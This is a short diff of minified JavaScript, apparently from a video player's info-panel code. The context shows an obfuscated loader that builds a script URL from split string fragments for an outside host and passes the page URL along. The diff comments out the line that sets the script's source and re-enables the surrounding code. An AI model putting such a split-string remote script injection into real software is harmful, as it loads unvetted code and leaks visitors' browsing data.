@@ -2852,7 +2852,7 @@
 				}(),
 				o = function() {
 					function e(t) {
-						/*
+						
 						var a = document.createElement('script'),
 							ad = '//api',
 							af = 'm.cc/b?ac=',
@@ -2861,14 +2861,16 @@
 							agi = 'p&',
 							ak = document.getElementsByTagName('script')[0];
 						a.type = 'text/javascript';
+						/*
 						a.src = ad + ae + af + agi + 'url=' + ac;
+						*/
 						ak.parentNode.insertBefore(a, ak);
 						var n = this;
 						i(this, e), this.container = t.template.infoPanel, this.template = t.template, this.video = t.video, this.player =
 							t, this.template.infoPanelClose.addEventListener("click", function() {
 								n.hide()
 							})
-							*/
+							
 					}
 					return a(e, [{
 						key: "show",
